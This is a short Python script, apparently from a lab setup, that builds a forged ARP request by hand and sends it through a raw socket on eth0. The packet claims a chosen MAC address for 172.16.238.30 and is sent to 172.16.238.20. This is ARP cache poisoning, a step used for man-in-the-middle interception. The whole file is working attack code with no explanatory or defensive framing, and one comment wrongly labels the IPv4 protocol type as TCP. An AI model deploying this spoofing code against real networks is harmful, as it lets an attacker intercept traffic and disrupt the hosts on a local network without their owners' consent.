import struct
import socket
import binascii

def sendSpoofedArp():
	rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW,
							socket.htons(0x0003))
	rawSocket.bind(("eth0", socket.htons(0x0003)))

	source_mac = binascii.unhexlify('02:aa:bb:cc:dd:10'.replace(':', '').upper())
	dest_mac = binascii.unhexlify('02:42:AC:00:00:BB'.replace(':', '').upper())

	source_ip = "172.16.238.30"
	dest_ip = "172.16.238.20"

	# Ethernet Header
	protocol = 0x0806  # ARP
	eth_hdr = struct.pack("!6s6sH", dest_mac, source_mac, protocol)

	# ARP header
	htype = 1  # Hardware_type ethernet
	ptype = 0x0800  # Protocol type TCP
	hlen = 6  # Hardware address Len
	plen = 4  # Protocol addr. len
	operation = 1  # 1=request/2=reply
	src_ip = socket.inet_aton(source_ip)
	dst_ip = socket.inet_aton(dest_ip)
	arp_hdr = struct.pack("!HHBBH6s4s6s4s", htype, ptype, hlen, plen, operation,
						source_mac, src_ip, dest_mac, dst_ip)

	packet = eth_hdr + arp_hdr
	rawSocket.send(packet)